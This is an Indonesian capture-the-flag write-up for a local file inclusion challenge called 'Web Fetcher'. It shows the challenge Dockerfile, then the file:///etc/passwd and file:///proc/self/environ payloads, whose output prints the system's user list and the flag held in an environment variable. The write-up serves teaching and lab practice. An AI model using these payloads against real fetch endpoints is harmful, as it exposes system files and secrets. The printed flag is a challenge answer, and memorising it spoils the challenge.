# Web Fetcher
<H2>Topic: LFI</H2>
Tools: browser, text viewer

Untuk meyelesaikan ini kita harus mengerti tata folder yang di dalam server. maka dari itu mari kita lihat code yang di dalam file DockerFile sebagai contoh. 
``` docker
FROM denoland/deno:latest

RUN mkdir -p /ctf
WORKDIR /ctf
COPY ./src/ .
COPY ./makefile .

RUN useradd -d /home/ctf/ -m -p ctf -s /bin/bash ctf
RUN echo "ctf:ctf" | chpasswd

ENV FLAG="Bukan Flag Asli"
RUN deno cache main.ts

USER ctf

ENV PORT=1337
EXPOSE 1337
CMD deno run --no-prompt \
    --allow-env \
    --allow-read \
    --allow-net \
    main.ts  
```
menurut code yang di atas kita akan mempunyai folder `/ctf` sebagai working directory lalu seluruh file yang ada di dalam `./src` akan di copy ke dalam `/ctf` lalu kita juga mempunyai flag kita yang berada di dalam environment variable. Mencoba web yang diberikan kita tahu web ini berfungsi untuk fetch dari input yang berikan.

Maka dari itu karena topic nya merupakan LFI kita harus mencari tahu bagaimana caranya untuk membaca environment variable. Dengan mencari di google kita bisa mendapat info tentang environment variable dengan membaca `/proc/self/environ` yang dimana file itu berupa list dari semua environment variable di mesin linux. 

untuk fecth nya biasanya kita bisa menggunakan cara `file://` mari kita coba payload pertama berupa 
```bash 
file:///etc/passwd
```
dengan output seperti ini
```bash
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-
data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List 
Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
deno:x:1993:1993::/home/deno:/bin/sh ctf:x:1994:1994::/home/ctf/:/bin/bash
```
code di atas berarti untuk membaca file /etc/paswwd, karena kita bisa membaca payload tersebut mari kita coba dengan
```bash
file:///proc/self/environ
```
yang dimana kita mendapatkan output ini
```bash
HOSTNAME=3a6abdf511de
PORT=1337
HOME=/home/ctf/
DENO_INSTALL_ROOT=/usr/local
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DENO_DIR=/deno-dir/
PWD=/ctf
FLAG=TCP1P{local_file_inclusion_with_fetch}
DENO_VERSION=1.29.1
```
